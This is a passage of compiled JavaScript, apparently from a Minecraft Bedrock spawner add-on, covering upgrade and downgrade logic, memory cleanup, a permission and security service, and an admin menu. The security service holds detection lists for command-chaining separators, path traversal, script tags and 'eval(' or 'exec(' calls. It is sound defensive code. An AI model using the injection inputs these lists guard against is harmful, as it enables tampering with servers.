  slider2.slider("Set Range", 1, 32, 1, 1);
  system2.run(() => {
    slider2.show(player).then((response) => {
      activeForms.delete(coordinates);
      if (!player || !player.isValid) {
        return;
      }
      if (!player.hasTag(`admin`)) {
        player.sendMessage("\xA7cYou don't have permission to use this feature.");
        return;
      }
      if (!isPlayerNearBlock(player, x, y, z, 10)) {
        player.sendMessage("\xA7cYou are too far from the spawner.");
        return;
      }
      if (response.formValues && response.formValues.length > 0) {
        const newLevel = response.formValues[0];
        if (newLevel) {
          player.sendMessage(`\xA76Level \xA77set to \xA72${newLevel}`);
          const newBlockType = `mrleefy:${spawnerType}spawner${newLevel}`;
          block.setType(newBlockType);
          clearMaxedSpawnerCache(x, y, z);
          const newTypeId = newBlockType;
          try {
            const dimension = player.dimension;
            const entities = dimension.getEntities({
              location: { x: x + 0.5, y: y + 0.5, z: z + 0.5 },
              maxDistance: 0.8,
              type: "mrleefy:spawnrule"
            });
            for (const ent of entities) {
              try {
                ent.remove();
              } catch (e) {
              }
            }
            const newEnt = dimension.spawnEntity("mrleefy:spawnrule", { x: x + 0.5, y: y + 0.5, z: z + 0.5 });
            newEnt.nameTag = newTypeId;
          } catch (error) {
            console.error("Error updating spawnrule in slider natively:", error);
          }
        }
      }
    }).catch(() => {
      activeForms.delete(coordinates);
    });
  });
}
function showInstructions(player) {
  const instructions = new ActionFormData();
  instructions.title("\xA7l\xA7eHow To Use Spawners");
  instructions.body(
    "\xA7f\xA7lGetting Started\xA7r\n\xA77Place your spawner and tap it to open this menu!\n\n\xA7a\xA7lUpgrading\xA7r\n\xA77- Have spawners of the \xA7esame type\xA77 in your inventory\n\xA77- Tap \xA7aUpgrade\xA77 to combine them\n\xA77- Higher levels = \xA7efaster spawns\xA77 + \xA7ebigger stacks\xA77!\n\n\xA7c\xA7lDowngrading\xA7r\n\xA77- Only works at Level 2+\n\xA77- Get a spawner back in your inventory\n\n\xA7b\xA7lMax Upgrade\xA7r\n\xA77- Uses ALL your spawners at once\n\xA77- Upgrades to the highest level possible (max 32)\n\xA77- Leftover spawners are returned to you\n\n\xA7d\xA7lTeleport Stack\xA7r\n\xA77- Brings nearby stacked mobs to this spawner\n\n\xA78Max level is 32. Each level boosts spawn rate and stack size!"
  );
  instructions.button("\xA7l\xA7aGot it!");
  instructions.show(player);
}
function maxUpgradeSpawner(player, block, level, spawnerType, typeId, x, y, z) {
  if (!player || !player.isValid)
    return;
  if (!isPlayerNearBlock(player, x, y, z, 10)) {
    player.sendMessage("\xA7cYou are too far from the spawner.");
    return;
  }
  if (level >= 32) {
    player.sendMessage("\xA74Cannot upgrade further. Maximum level reached.");
    return;
  }
  const inventoryComp = player.getComponent("inventory");
  if (!inventoryComp || !inventoryComp.container)
    return;
  const inventory = inventoryComp.container;
  const spawnerItemPrefix = `mrleefy:${spawnerType}spawner`;
  const spawnerEntries = [];
  let totalAvailableLevels = 0;
  for (let i = 0; i < inventory.size; i++) {
    const item = inventory.getItem(i);
    if (item && item.typeId.startsWith(spawnerItemPrefix)) {
      const itemLevel = parseInt(item.typeId.replace(spawnerItemPrefix, "")) || 1;
      spawnerEntries.push({ slot: i, item, level: itemLevel });
      totalAvailableLevels += itemLevel * item.amount;
    }
  }
  if (totalAvailableLevels === 0) {
    player.sendMessage(`\xA74You don't have any ${spawnerType} spawners in your inventory, unable to upgrade.`);
    return;
  }
  spawnerEntries.sort((a, b) => a.level - b.level);
  const levelsNeeded = 32 - level;
  let levelsConsumed = 0;
  const spawnersToRemove = [];
  let refundAmount = 0;
  for (const entry of spawnerEntries) {
    if (levelsConsumed >= levelsNeeded)
      break;
    const { slot, item, level: itemLevel } = entry;
    let amountToConsume = 0;
    for (let count = 1; count <= item.amount; count++) {
      levelsConsumed += itemLevel;
      amountToConsume = count;
      if (levelsConsumed >= levelsNeeded) {
        if (levelsConsumed > levelsNeeded) {
          refundAmount = levelsConsumed - levelsNeeded;
        }
        break;
      }
    }
    spawnersToRemove.push({ slot, item, amount: amountToConsume });
  }
  for (const entry of spawnersToRemove) {
    const { slot, item, amount } = entry;
    if (item.amount <= amount) {
      inventory.setItem(slot, null);
    } else {
      item.amount -= amount;
      inventory.setItem(slot, item);
    }
  }
  const newLevel = level + Math.min(levelsNeeded, levelsConsumed - refundAmount);
  const newTypeId = `${spawnerItemPrefix}${newLevel}`;
  block.setType(newTypeId);
  const coordinates = `${x},${y},${z}`;
  const existingData = spawnerDatabase.read(coordinates);
  if (existingData) {
    existingData.typeId = newTypeId;
    existingData.lastAccessed = Date.now();
    spawnerDatabase.write(coordinates, existingData);
  }
  clearMaxedSpawnerCache(x, y, z);
  try {
    const dimension = player.dimension;
    const entities = dimension.getEntities({
      location: { x: x + 0.5, y: y + 0.5, z: z + 0.5 },
      maxDistance: 0.8,
      type: "mrleefy:spawnrule"
    });
    for (const ent of entities) {
      try {
        ent.remove();
      } catch (e) {
      }
    }
    const newEnt = dimension.spawnEntity("mrleefy:spawnrule", { x: x + 0.5, y: y + 0.5, z: z + 0.5 });
    newEnt.nameTag = newTypeId;
  } catch (error) {
    console.error("Error executing spawnrule updates natively:", error);
  }
  player.sendMessage(`\xA77Successfully Upgraded to level \xA72\xA7l${newLevel}`);
  try {
    player.playSound("random.levelup");
  } catch (error) {
  }
  try {
    block.dimension.spawnParticle(
      "minecraft:crop_growth_area_emitter",
      new Vector32(block.x + 0.5, block.y + 0.5, block.z + 0.5),
      new MolangVariableMap()
    );
  } catch (e) {
  }
  if (refundAmount > 0) {
    giveItemNatively(player, `${spawnerItemPrefix}1`, refundAmount);
    player.sendMessage(`\xA77Refunded \xA72\xA7l${refundAmount} level 1 spawners\xA77.`);
  }
}
function upgradeSpawner(player, block, level, spawnerType, typeId, x, y, z) {
  if (!player || !player.isValid)
    return;
  if (!isPlayerNearBlock(player, x, y, z, 10)) {
    player.sendMessage("\xA7cYou are too far from the spawner.");
    return;
  }
  const inventoryComp = player.getComponent("inventory");
  if (!inventoryComp || !inventoryComp.container)
    return;
  const inventory = inventoryComp.container;
  const spawnerItemPrefix = `mrleefy:${spawnerType}spawner`;
  const newLevel = level + 1;
  if (newLevel > 32) {
    player.sendMessage("\xA74Cannot upgrade further. Maximum level reached.");
    return;
  }
  let totalLevels = 0;
  const refundQueue = [];
  const spawnersToRemove = [];
  const spawnerLevels = [];
  for (let i = 0; i < inventory.size; i++) {
    const item = inventory.getItem(i);
    if (item && item.typeId.startsWith(spawnerItemPrefix)) {
      const itemLevel = parseInt(item.typeId.replace(spawnerItemPrefix, "")) || 1;
      spawnerLevels.push({ slot: i, item, level: itemLevel });
    }
  }
  spawnerLevels.sort((a, b) => a.level - b.level);
  for (const entry of spawnerLevels) {
    const { slot, item, level: itemLevel } = entry;
    if (itemLevel === 1) {
      spawnersToRemove.push({ slot, item, amount: 1 });
      totalLevels += 1;
    } else if (totalLevels === 0) {
      spawnersToRemove.push({ slot, item, amount: 1 });
      totalLevels = itemLevel;
      if (itemLevel > 1) {
        refundQueue.push({ level: 1, amount: itemLevel - 1 });
      }
    }
    if (totalLevels >= 1)
      break;
  }
  if (totalLevels < 1) {
    player.sendMessage(`\xA74You don't have enough spawners in your inventory to upgrade.`);
    return;
  }
  for (const entry of spawnersToRemove) {
    const { slot, item, amount } = entry;
    if (item.amount <= amount) {
      inventory.setItem(slot, null);
    } else {
      item.amount -= amount;
      inventory.setItem(slot, item);
    }
  }
  for (const refund of refundQueue) {
    giveItemNatively(player, `${spawnerItemPrefix}1`, refund.amount);
  }
  block.setType(`${spawnerItemPrefix}${newLevel}`);
  player.sendMessage(`\xA77Successfully upgraded to level \xA72\xA7l${newLevel}`);
  const coordinates = `${x},${y},${z}`;
  const existingData = spawnerDatabase.read(coordinates);
  if (existingData) {
    existingData.typeId = `${spawnerItemPrefix}${newLevel}`;
    existingData.lastAccessed = Date.now();
    spawnerDatabase.write(coordinates, existingData);
  }
  clearMaxedSpawnerCache(x, y, z);
  try {
    const dimension = player.dimension;
    const entities = dimension.getEntities({
      location: { x: x + 0.5, y: y + 0.5, z: z + 0.5 },
      maxDistance: 0.8,
      type: "mrleefy:spawnrule"
    });
    for (const ent of entities) {
      try {
        ent.remove();
      } catch (e) {
      }
    }
    const newEnt = dimension.spawnEntity("mrleefy:spawnrule", { x: x + 0.5, y: y + 0.5, z: z + 0.5 });
    newEnt.nameTag = `mrleefy:${spawnerType}spawner${newLevel}`;
  } catch (error) {
    console.error("Error executing command natively:", error);
  }
}
function downgrade(player, block, level, spawnerType, percentrefund, refu, x, y, z) {
  if (!player || !player.isValid)
    return;
  if (!isPlayerNearBlock(player, x, y, z, 10)) {
    player.sendMessage("\xA7cYou are too far from the spawner.");
    return;
  }
  if (!block || !block.isValid) {
    player.sendMessage("\xA7cInvalid spawner block detected.");
    return;
  }
  if (level <= 1) {
    player.sendMessage("\xA7cCannot downgrade further. Minimum level reached.");
    return;
  }
  const coordinates = `${x},${y},${z}`;
  const dimension = block.dimension;
  const currentBlock = dimension.getBlock(new Vector32(x, y, z));
  if (!currentBlock || currentBlock.typeId !== `mrleefy:${spawnerType}spawner${level}`) {
    player.sendMessage("\xA7cNo spawner block found at the recorded location, action canceled.");
    return;
  }
  const inventoryComp = player.getComponent("inventory");
  if (!inventoryComp || !inventoryComp.container)
    return;
  const inventory = inventoryComp.container;
  let hasEmptySlot = false;
  for (let i = 0; i < inventory.size; i++) {
    if (!inventory.getItem(i)) {
      hasEmptySlot = true;
      break;
    }
  }
  if (!hasEmptySlot) {
    player.sendMessage(`\xA74You don't have enough space in your inventory to perform the downgrade.`);
    return;
  }
  const newLevel = level - 1;
  const newTypeId = `mrleefy:${spawnerType}spawner${newLevel}`;
  block.setType(newTypeId);
  const existingData = spawnerDatabase.read(coordinates);
  if (existingData) {
    existingData.typeId = newTypeId;
    existingData.lastAccessed = Date.now();
    spawnerDatabase.write(coordinates, existingData);
  }
  try {
    const dimension2 = player.dimension;
    const entities = dimension2.getEntities({
      location: { x: block.x + 0.5, y: block.y + 0.5, z: block.z + 0.5 },
      maxDistance: 0.8,
      type: "mrleefy:spawnrule"
    });
    for (const ent of entities) {
      try {
        ent.remove();
      } catch (e) {
      }
    }
    const newEnt = dimension2.spawnEntity("mrleefy:spawnrule", { x: x + 0.5, y: y + 0.5, z: z + 0.5 });
    newEnt.nameTag = newTypeId;
  } catch (error) {
    console.error("Error updating spawnrule in downgrade natively:", error);
  }
  giveItemNatively(player, `mrleefy:${spawnerType}spawner1`, 1);
  player.sendMessage(`\xA77Successfully downgraded to level \xA72\xA7l${newLevel}`);
  try {
    player.playSound("mob.irongolem.crack");
  } catch (error) {
  }
  try {
    dimension.spawnParticle(
      "minecraft:villager_angry",
      new Vector32(block.x + 0.5, block.y + 0.5, block.z + 0.5),
      new MolangVariableMap()
    );
  } catch (e) {
  }
}
function removeSpawnruleAtLocation(x, y, z, dimension) {
  try {
    const spawnruleEntities = dimension.getEntities({
      type: "mrleefy:spawnrule",
      location: { x, y, z },
      maxDistance: 1
    });
    system2.run(() => {
      for (const entity of spawnruleEntities) {
        if (entity?.isValid) {
          try {
            entity.remove();
          } catch (removeError) {
            console.error(`Error removing spawnrule entity:`, removeError);
          }
        }
      }
    });
  } catch (error) {
    console.error(`Error finding spawnrule at ${x},${y},${z}:`, error);
  }
}
function enforcePlayerMemoryLimits() {
  const now = Date.now();
  if (activeForms.size > PLAYER_MEMORY_LIMITS.ACTIVE_FORMS) {
    const entries = Array.from(activeForms.entries());
    const toRemove = entries.slice(0, Math.floor(entries.length / 2));
    toRemove.forEach(([key]) => activeForms.delete(key));
  }
  const formTimeout = 5 * 60 * 1e3;
  for (const [key, activeData] of activeForms.entries()) {
    const player = activeData.player || activeData;
    const timestamp = activeData.timestamp || now;
    if (!player || !player.isValid || now - timestamp > formTimeout) {
      activeForms.delete(key);
    }
  }
  if (messageTimes.size > PLAYER_MEMORY_LIMITS.MESSAGE_TIMES) {
    const cutoffTime = now - TIMING.MESSAGE_DELAY * 2;
    for (const [key, timestamp] of messageTimes.entries()) {
      if (timestamp < cutoffTime) {
        messageTimes.delete(key);
      }
    }
    if (messageTimes.size > PLAYER_MEMORY_LIMITS.MESSAGE_TIMES) {
      const entries = Array.from(messageTimes.entries());
      entries.sort((a, b) => a[1] - b[1]);
      const toRemove = entries.slice(0, messageTimes.size - PLAYER_MEMORY_LIMITS.MESSAGE_TIMES);
      toRemove.forEach(([key]) => messageTimes.delete(key));
    }
  }
  if (typeof interactionTimestamps !== "undefined" && interactionTimestamps.size > PLAYER_MEMORY_LIMITS.INTERACTION_TIMESTAMPS) {
    const cutoffTime = now - INTERACTION_WINDOW_MILLIS * 2;
    for (const [key, timestamps] of interactionTimestamps.entries()) {
      if (Array.isArray(timestamps)) {
        const validTimestamps = timestamps.filter((t) => now - t < INTERACTION_WINDOW_MILLIS);
        if (validTimestamps.length === 0) {
          interactionTimestamps.delete(key);
        } else {
          interactionTimestamps.set(key, validTimestamps);
        }
      }
    }
  }
  if (typeof globalCooldowns !== "undefined" && globalCooldowns.size > PLAYER_MEMORY_LIMITS.COOLDOWNS) {
    const cutoffTime = now - GLOBAL_COOLDOWN_MILLIS;
    for (const [key, timestamp] of globalCooldowns.entries()) {
      if (now - timestamp > GLOBAL_COOLDOWN_MILLIS) {
        globalCooldowns.delete(key);
      }
    }
    if (globalCooldowns.size > PLAYER_MEMORY_LIMITS.COOLDOWNS) {
      const remainingEntries = Array.from(globalCooldowns.entries());
      remainingEntries.sort((a, b) => a[1] - b[1]);
      const toRemove = remainingEntries.slice(0, globalCooldowns.size - PLAYER_MEMORY_LIMITS.COOLDOWNS);
      toRemove.forEach(([k]) => globalCooldowns.delete(k));
    }
  }
  if (cooldowns.size > PLAYER_MEMORY_LIMITS.COOLDOWNS) {
    const cutoffTime = now - cooldownTime;
    for (const [key, timestamp] of cooldowns.entries()) {
      if (now - timestamp > cooldownTime) {
        cooldowns.delete(key);
      }
    }
    if (cooldowns.size > PLAYER_MEMORY_LIMITS.COOLDOWNS) {
      const remainingEntries = Array.from(cooldowns.entries());
      remainingEntries.sort((a, b) => a[1] - b[1]);
      const toRemove = remainingEntries.slice(0, cooldowns.size - PLAYER_MEMORY_LIMITS.COOLDOWNS);
      toRemove.forEach(([k]) => cooldowns.delete(k));
    }
  }
}
system2.runInterval(() => {
  try {
    enforcePlayerMemoryLimits();
  } catch (error) {
    console.error("Player memory cleanup error:", error);
  }
}, PLAYER_CLEANUP_INTERVAL);
function exit(player) {
  return;
}
function updateSpawnerDatabaseOnInteraction(coordinates, typeId, player) {
  try {
    const existingData = spawnerDatabase.read(coordinates);
    if (!existingData) {
      const spawnerData = {
        typeId,
        placedBy: player.name || player.nameTag || "Unknown",
        placedAt: Date.now(),
        entitiesKilled: 0,
        lastAccessed: Date.now(),
        interactedAt: Date.now()
      };
      spawnerDatabase.write(coordinates, spawnerData);
    } else {
      existingData.typeId = typeId;
      existingData.lastAccessed = Date.now();
      existingData.interactedAt = existingData.interactedAt || Date.now();
      if (existingData.placedBy === "Existing") {
        existingData.placedBy = player.name || player.nameTag || "Unknown";
        existingData.placedAt = Date.now();
      }
      spawnerDatabase.write(coordinates, existingData);
    }
  } catch (error) {
    console.error(`Error updating spawner database on interaction: ${error}`);
  }
}

// src/security-service.ts
var SecurityService = class {
  constructor() {
    __publicField(this, "permissionLevels");
    __publicField(this, "commandCooldowns");
    __publicField(this, "suspiciousActivity");
    __publicField(this, "bannedCommands");
    __publicField(this, "ipWhitelist");
    __publicField(this, "sessionTokens");
    __publicField(this, "securityEvents");
    this.permissionLevels = {
      USER: 0,
      ADMIN: 1,
      OWNER: 2
    };
    this.commandCooldowns = /* @__PURE__ */ new Map();
    this.suspiciousActivity = /* @__PURE__ */ new Map();
    this.bannedCommands = /* @__PURE__ */ new Set([
      "execute",
      "function",
      "gamerule",
      "setblock",
      "fill",
      "clone",
      "summon",
      "give",
      "tp",
      "teleport",
      "kill",
      "effect",
      "enchant"
    ]);
    this.ipWhitelist = /* @__PURE__ */ new Set();
    this.sessionTokens = /* @__PURE__ */ new Map();
    this.securityEvents = [];
  }
  /**
   * Check if player has required permission level
   * @param player - The player to check
   * @param requiredLevel - Required permission level
   * @returns True if player has permission
   */
  hasPermission(player, requiredLevel = this.permissionLevels.USER) {
    if (!player?.isValid)
      return false;
    try {
      if (player.hasTag(UI.OWNER_PERMISSION_TAG)) {
        return true;
      }
      if (requiredLevel <= this.permissionLevels.ADMIN) {
        if (player.hasTag(UI.ADMIN_PERMISSION_TAG)) {
          return true;
        }
      }
      if (requiredLevel <= this.permissionLevels.USER) {
        return true;
      }
      return false;
    } catch (error) {
      performanceMonitor.recordError("permission_check", error.message);
      return false;
    }
  }
  /**
   * Check if player has specific tag-based permission
   * @param player - The player to check
   * @param permissionTag - The permission tag to check
   * @returns True if player has permission
   */
  hasTagPermission(player, permissionTag) {
    if (!player?.isValid || !permissionTag)
      return false;
    try {
      return player.hasTag(permissionTag);
    } catch (error) {
      performanceMonitor.recordError("tag_permission_check", error.message);
      return false;
    }
  }
  /**
   * Grant permission to player
   * @param granter - Player granting permission
   * @param target - Player receiving permission
   * @param permissionTag - Permission tag to grant
   * @returns True if permission was granted
   */
  grantPermission(granter, target, permissionTag) {
    if (!this.hasPermission(granter, this.permissionLevels.OWNER)) {
      this.logSecurityEvent("unauthorized_permission_grant", granter, {
        target: target?.name,
        permission: permissionTag
      });
      return false;
    }
    if (!target?.isValid || !permissionTag)
      return false;
    try {
      target.addTag(permissionTag);
      this.logSecurityEvent("permission_granted", granter, {
        target: target.name,
        permission: permissionTag
      });
      return true;
    } catch (error) {
      performanceMonitor.recordError("permission_grant", error.message);
      return false;
    }
  }
  /**
   * Revoke permission from player
   * @param revoker - Player revoking permission
   * @param target - Player losing permission
   * @param permissionTag - Permission tag to revoke
   * @returns True if permission was revoked
   */
  revokePermission(revoker, target, permissionTag) {
    if (!this.hasPermission(revoker, this.permissionLevels.OWNER)) {
      this.logSecurityEvent("unauthorized_permission_revoke", revoker, {
        target: target?.name,
        permission: permissionTag
      });
      return false;
    }
    if (!target?.isValid || !permissionTag)
      return false;
    try {
      target.removeTag(permissionTag);
      this.logSecurityEvent("permission_revoked", revoker, {
        target: target.name,
        permission: permissionTag
      });
      return true;
    } catch (error) {
      performanceMonitor.recordError("permission_revoke", error.message);
      return false;
    }
  }
  /**
   * Validate command input for security
   * @param player - Player executing command
   * @param command - Command to validate
   * @param args - Command arguments
   * @returns Validation result with isValid and error message
   */
  validateCommand(player, command, args = []) {
    const validation = {
      isValid: true,
      error: null,
      warnings: []
    };
    try {
      const cooldownKey = `${player.name}_${command}`;
      const now = Date.now();
      const lastUse = this.commandCooldowns.get(cooldownKey);
      if (lastUse && now - lastUse < 1e3) {
        validation.isValid = false;
        validation.error = "Command cooldown active. Please wait before using this command again.";
        return validation;
      }
      if (this.bannedCommands.has(command.toLowerCase())) {
        if (!this.hasPermission(player, this.permissionLevels.OWNER)) {
          validation.isValid = false;
          validation.error = "This command is restricted.";
          this.logSecurityEvent("banned_command_attempt", player, { command });
          return validation;
        }
      }
      const argValidation = this.validateCommandArguments(command, args);
      if (!argValidation.isValid) {
        validation.isValid = false;
        validation.error = argValidation.error;
        return validation;
      }
      const suspiciousPatterns = this.detectSuspiciousPatterns(args);
      if (suspiciousPatterns.length > 0) {
        validation.warnings.push(...suspiciousPatterns);
        this.logSecurityEvent("suspicious_command_pattern", player, {
          command,
          args,
          patterns: suspiciousPatterns
        });
      }
      if (validation.isValid) {
        this.commandCooldowns.set(cooldownKey, now);
        if (this.commandCooldowns.size > 1e3) {
          this.cleanupExpiredCooldowns(now);
        }
      }
    } catch (error) {
      performanceMonitor.recordError("command_validation", error.message);
      validation.isValid = false;
      validation.error = "Command validation failed due to internal error.";
    }
    return validation;
  }
  /**
   * Validate command arguments
   * @param command - Command name
   * @param args - Command arguments
   * @returns Validation result
   */
  validateCommandArguments(command, args) {
    const result = { isValid: true, error: null };
    for (let i = 0; i < args.length; i++) {
      const arg = args[i];
      if (arg.includes("&&") || arg.includes("||") || arg.includes(";")) {
        result.isValid = false;
        result.error = "Invalid command arguments detected.";
        return result;
      }
      if (arg.includes("../") || arg.includes("..\\")) {
        result.isValid = false;
        result.error = "Invalid file path detected.";
        return result;
      }
      if (command === "setlevel" && i === 0) {
        const level = parseInt(arg);
        if (isNaN(level) || level < VALIDATION.MIN_LEVEL || level > VALIDATION.MAX_LEVEL) {
          result.isValid = false;
          result.error = `Level must be between ${VALIDATION.MIN_LEVEL} and ${VALIDATION.MAX_LEVEL}.`;
          return result;
        }
      }
    }
    return result;
  }
  /**
   * Detect suspicious patterns in command arguments
   * @param args - Command arguments
   * @returns Array of suspicious patterns found
   */
  detectSuspiciousPatterns(args) {
    const patterns = [];
    const suspiciousStrings = [
      "javascript:",
      "data:",
      "vbscript:",
      "onload=",
      "onerror=",
      "<script",
      "<\/script>",
      "eval(",
      "exec(",
      "system(",
      "127.0.0.1",
      "localhost",
      "0.0.0.0"
    ];
    args.forEach((arg) => {
      suspiciousStrings.forEach((pattern) => {
        if (arg.toLowerCase().includes(pattern)) {
          patterns.push(`Suspicious pattern detected: ${pattern}`);
        }
      });
    });
    return patterns;
  }
  /**
   * Check if player is rate limited
   * @param player - Player to check
   * @param action - Action being performed
   * @param maxActions - Maximum actions allowed
   * @param timeWindow - Time window in milliseconds
   * @returns True if rate limited
   */
  isRateLimited(player, action, maxActions = 10, timeWindow = 6e4) {
    const now = Date.now();
    const key = `${player.name}_${action}`;
    if (!this.suspiciousActivity.has(key)) {
      this.suspiciousActivity.set(key, []);
    }
    const timestamps = this.suspiciousActivity.get(key);
    const cutoff = now - timeWindow;
    const recentTimestamps = timestamps.filter((ts) => ts > cutoff);
    if (recentTimestamps.length >= maxActions) {
      this.logSecurityEvent("rate_limit_exceeded", player, { action, maxActions, timeWindow });
      return true;
    }
    recentTimestamps.push(now);
    this.suspiciousActivity.set(key, recentTimestamps);
    return false;
  }
  /**
   * Clean up expired cooldowns
   * @param now - Current timestamp
   */
  cleanupExpiredCooldowns(now) {
    const cutoff = now - 6e4;
    for (const [key, timestamp] of this.commandCooldowns.entries()) {
      if (timestamp < cutoff) {
        this.commandCooldowns.delete(key);
      }
    }
  }
  /**
   * Log security event
   * @param eventType - Type of security event
   * @param player - Player involved
   * @param details - Additional event details
   */
  logSecurityEvent(eventType, player, details = {}) {
    const event = {
      timestamp: Date.now(),
      eventType,
      playerId: player?.id,
      playerName: player?.name,
      details,
      severity: this.getEventSeverity(eventType)
    };
    const logMessage = `[SECURITY] ${eventType}: Player ${player?.name || "Unknown"} - ${JSON.stringify(details)}`;
    if (event.severity === "high") {
      console.error(logMessage);
    } else if (event.severity === "medium") {
      console.warn(logMessage);
    } else {
      console.log(logMessage);
    }
    this.storeSecurityEvent(event);
    performanceMonitor.recordEvent("securityEvents");
  }
  /**
   * Get severity level for security event
   * @param eventType - Type of event
   * @returns Severity level (low, medium, high)
   */
  getEventSeverity(eventType) {
    const highSeverity = [
      "unauthorized_permission_grant",
      "unauthorized_permission_revoke",
      "banned_command_attempt",
      "rate_limit_exceeded"
    ];
    const mediumSeverity = [
      "suspicious_command_pattern",
      "permission_granted",
      "permission_revoked"
    ];
    if (highSeverity.includes(eventType))
      return "high";
    if (mediumSeverity.includes(eventType))
      return "medium";
    return "low";
  }
  /**
   * Store security event for admin review
   * @param event - Security event to store
   */
  storeSecurityEvent(event) {
    if (!this.securityEvents) {
      this.securityEvents = [];
    }
    this.securityEvents.push(event);
    if (this.securityEvents.length > 1e3) {
      this.securityEvents.shift();
    }
  }
  /**
   * Get recent security events
   * @param count - Number of events to return
   * @param severity - Filter by severity (optional)
   * @returns Array of security events
   */
  getSecurityEvents(count = 50, severity = null) {
    let events = this.securityEvents || [];
    if (severity) {
      events = events.filter((event) => event.severity === severity);
    }
    return events.slice(-count);
  }
  /**
   * Get security statistics
   * @returns Security statistics
   */
  getSecurityStats() {
    const events = this.securityEvents || [];
    const now = Date.now();
    const lastHour = now - 60 * 60 * 1e3;
    const recentEvents = events.filter((event) => event.timestamp > lastHour);
    const stats = {
      totalEvents: events.length,
      recentEvents: recentEvents.length,
      highSeverityEvents: recentEvents.filter((e) => e.severity === "high").length,
      mediumSeverityEvents: recentEvents.filter((e) => e.severity === "medium").length,
      lowSeverityEvents: recentEvents.filter((e) => e.severity === "low").length,
      eventsPerHour: recentEvents.length,
      activeRateLimits: this.suspiciousActivity.size,
      activeCooldowns: this.commandCooldowns.size
    };
    return stats;
  }
  /**
   * Clear security data (admin only)
   * @param admin - Admin requesting the clear
   * @returns True if cleared successfully
   */
  clearSecurityData(admin) {
    if (!this.hasPermission(admin, this.permissionLevels.OWNER)) {
      this.logSecurityEvent("unauthorized_security_clear", admin);
      return false;
    }
    this.suspiciousActivity.clear();
    this.commandCooldowns.clear();
    this.securityEvents = [];
    this.logSecurityEvent("security_data_cleared", admin);
    return true;
  }
};
var securityService = new SecurityService();

// src/mobstacker-ui.ts
var aaDatabase = new Database("AAValues");
var MAX_ALLOWED_SPEED = 60;
var MAX_ALLOWED_STACK = 5e3;
var defaultAAValues = {
  "1-10": { qty: 1, speed: 15, maxStack: 100 },
  "11-20": { qty: 2, speed: 12, maxStack: 300 },
  "21-30": { qty: 3, speed: 9, maxStack: 500 },
  "31-31": { qty: 4, speed: 6, maxStack: 700 },
  "32-32": { qty: 5, speed: 3, maxStack: 1e3 }
};
var aaLookup = Array.from({ length: 33 }, () => ({ qty: 0, speed: 0, maxStack: 100 }));
function rebuildAALookup() {
  try {
    for (let i = 0; i < aaLookup.length; i++) {
      aaLookup[i] = { qty: 0, speed: 0, maxStack: 100 };
    }
    aaDatabase.forEach((value, range) => {
      if (!value)
        return;
      const { qty = 0, speed = 0, maxStack = 100 } = value;
      const [min, max] = range.split("-").map(Number);
      if (!isNaN(min) && !isNaN(max)) {
        for (let lvl = min; lvl <= max && lvl < aaLookup.length; lvl++) {
          aaLookup[lvl] = { qty, speed, maxStack };
        }
      }
    });
  } catch (error) {
    console.error("Failed to rebuild AA lookup:", error);
    Object.entries(defaultAAValues).forEach(([range, data]) => {
      const [min, max] = range.split("-").map(Number);
      if (!isNaN(min) && !isNaN(max)) {
        for (let lvl = min; lvl <= max && lvl < aaLookup.length; lvl++) {
          aaLookup[lvl] = { ...data };
        }
      }
    });
  }
}
system3.run(() => {
  system3.run(() => {
    try {
      if (aaDatabase.length === 0) {
        Object.entries(defaultAAValues).forEach(([range, data]) => {
          try {
            aaDatabase.write(range, data);
          } catch (error) {
            console.error(`Failed to write default AA value for range ${range}:`, error);
          }
        });
      }
    } catch (error) {
      console.error("Failed to initialize AA database:", error);
    }
    rebuildAALookup();
  });
});
function getAAValueForLevel(level) {
  return aaLookup[level] || { qty: 0, speed: 0, maxStack: 100 };
}
world4.afterEvents.itemUse.subscribe((event) => {
  const { source, itemStack } = event;
  if (itemStack.typeId === "minecraft:blaze_rod" && source.hasTag("admin")) {
    openAdminMenu(source);
  }
});
function openAdminMenu(player) {
  if (!player || !player.isValid) {
    console.error(ERROR_MESSAGES.INVALID_PLAYER);
    return;
  }
  if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
    player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
    securityService.logSecurityEvent("unauthorized_admin_access", player, {
      attemptedAction: "openAdminMenu"
    });
    return;
  }
  const form = new ActionFormData2().title("Leefy Spawner Settings").body("\xA77Configure spawner behavior and performance settings\n\xA7c\u26A0 Performance settings require server/world restart").button("Spawner Settings", "textures/items/diamond").button("Entity Loot Tables", "textures/blocks/chest_front").button("Stack Radius", "textures/items/snowball").button("Loot Drop Rules", "textures/items/lever.png").button("Performance Settings \xA7c(Requires Restart)", "textures/items/clock_item").button("Spawner Statistics", "textures/items/book_normal").button("Teleport to Spawner", "textures/items/ender_pearl").button("Verify & Clean Database", "textures/items/book_normal").button(isLoggingEnabled() ? "Disable Logging" : "Enable Logging", "textures/items/paper");
  form.show(player).then((r) => {
    if (r.canceled)
      return;
    if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
      player.sendMessage(ERROR_MESSAGES.NO_PERMISSION);
      securityService.logSecurityEvent("unauthorized_admin_action", player, {
        attemptedAction: `admin_menu_selection_${r.selection}`
      });
      return;
    }
    const commandValidation = securityService.validateCommand(player, "admin_action", [`selection_${r.selection}`]);
    if (!commandValidation.isValid) {
      player.sendMessage(`\xA7c${commandValidation.error}`);
      return;
    }
    if (commandValidation.warnings.length > 0) {
      commandValidation.warnings.forEach((warning) => {
        console.warn(`Admin action warning for ${player.name}: ${warning}`);
      });
    }
    system3.run(() => {
      switch (r.selection) {
        case 0:
          openAAConfigForm(player);
          break;
        case 1:
          openLootTableConfigForm(player);
          break;
        case 2:
          openRadiusConfigForm(player);
          break;
        case 3:
          openToggleLootDropForm(player);
          break;
        case 4:
          openPerformanceConfigForm(player);
          break;
        case 5:
          openSpawnerStatisticsForm(player);
          break;
        case 6:
          openSpawnerTeleportForm(player);
          break;
        case 7:
          verifyAndCleanSpawnerDatabase(player);
          break;
        case 8:
          toggleLogging(player);
          break;
      }
    });
    securityService.logSecurityEvent("admin_action_executed", player, {
      action: `selection_${r.selection}`,
      warnings: commandValidation.warnings.length
    });
  }).catch((error) => {
    console.error(`Error in openAdminMenu: ${error}`);
    player.sendMessage("\xA7cAn error occurred while opening the admin menu.");
    performanceMonitor.recordError("admin_menu_error", error instanceof Error ? error.message : String(error));
  }).finally(() => {
    cooldowns.set(player.name, Date.now());
  });
}
function openToggleLootDropForm(player) {
  if (!player || !player.isValid)
    return;
  if (!securityService.hasTagPermission(player, UI.ADMIN_PERMISSION_TAG)) {
